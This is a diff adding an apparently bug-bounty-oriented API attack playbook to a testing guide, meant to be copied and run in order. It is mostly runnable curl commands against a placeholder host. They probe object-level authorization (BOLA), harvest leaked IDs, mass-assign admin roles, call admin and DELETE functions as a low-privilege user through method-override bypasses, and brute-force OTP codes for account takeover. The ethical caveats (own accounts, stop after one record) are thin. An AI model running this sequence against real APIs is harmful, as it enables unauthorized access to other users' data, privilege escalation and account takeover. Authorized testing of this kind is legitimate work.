@@ -14,6 +14,47 @@ H='api.target.com'
 
 ---
 
+## §0.0 — THE WHOLE ATTACK IN ONE SEQUENCE (copy top-to-bottom)
+> The end-to-end API chain in runnable, yield order: **map → BOLA → ID-leak→UUID BOLA → mass-assign → BFLA → broken-auth**. Each block maps to a guide section. Fill `H`, `$A`/`$B` (two accounts you own), ids, field names. Wire-level narrative = **guide Appendix D**.
+```bash
+# ── 0. SET ONCE ─────────────────────────────────────────────────────────────
+H='api.target.com'
+A='Authorization: Bearer <token_A>'; B='Authorization: Bearer <token_B>'   # two accounts you own
+LOW='Authorization: Bearer <low_priv>'                                     # low-priv for BFLA
+
+# ── 1. MAP (spec → whole surface) (guide §1.1) ──────────────────────────────
+for p in openapi.json swagger.json v3/api-docs api-docs swagger-ui.html postman; do
+  printf "%-22s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://$H/$p"; done
+#   import a found spec into Burp/Postman → every endpoint incl. /admin/* the UI hides + old /v1/ (API9).
+
+# ── 2. BOLA — two-account, A's token on B's object (§5)  [highest yield first] ─
+curl -s "https://$H/api/v2/users/7042" -H "$A"      # WIN = B's PII returned to A → cross-tenant BOLA. Read ONE, stop.
+
+# ── 3. ID-LEAK → weaponize UUID BOLA (§5 sub-types / §16) ───────────────────
+curl -s "https://$H/api/v2/orgs/5001/members" -H "$A"          # over-returns others' UUIDs/emails (excessive data)
+curl -s "https://$H/api/v2/invoices/<leaked-uuid>" -H "$A"     # now the 'unguessable' object is reachable
+
+# ── 4. MASS ASSIGNMENT — add the hidden field, read it back (§7.2) ──────────
+curl -s -X PATCH "https://$H/api/v2/users/ME" -H "$A" -H 'Content-Type: application/json' \
+     -d '{"name":"A","role":"org_admin","isAdmin":true,"emailVerified":true}'
+curl -s "https://$H/api/v2/users/ME" -H "$A"                   # re-GET: did role STICK? (echo != persisted)
+
+# ── 5. BFLA — call the admin function / tamper the verb as low-priv (§9/§15) ─
+curl -s -X PUT "https://$H/api/admin/users/7042/role" -H "$LOW" -H 'Content-Type: application/json' -d '{"role":"member"}'
+curl -s -X DELETE "https://$H/api/v2/orders/7042" -H "$LOW"    # verb the UI never uses
+curl -s -X POST "https://$H/api/v2/orders/7042" -H "$LOW" -H 'X-HTTP-Method-Override: DELETE'   # method-override bypass
+
+# ── 6. BROKEN AUTH — unthrottled OTP/reset → ATO primitive (§6)  [own account] ─
+for c in $(seq -w 0 50); do curl -s -o /dev/null -w "%{http_code}\n" -X POST "https://$H/api/v2/auth/otp/verify" \
+  -H 'Content-Type: application/json' -d "{\"userId\":\"MINE\",\"code\":\"0000$c\"}"; done   # is the N-th attempt still evaluated?
+
+# ── 7. OLD VERSION re-test (API9) → same bug, no patch (§13) ─────────────────
+curl -s "https://$H/api/v1/users/7042" -H "$A"                 # BOLA fixed in v2 may be wide open in v1
+```
+**Order rationale:** map first (coverage is everything) → **BOLA is the #1 API bug**, so sweep IDs before anything else → ID-leak upgrades UUID BOLA → mass-assign/BFLA are the escalators to admin/cross-tenant → broken-auth is the ATO path. Lead the report with the highest **demonstrated** impact (cross-tenant/admin/ATO), quantify scope, never mass-exfiltrate.
+
+---
+
 ## 1. Discovery / spec
 ```bash
 for p in openapi.json openapi.yaml swagger.json v2/api-docs v3/api-docs api-docs swagger-ui.html \
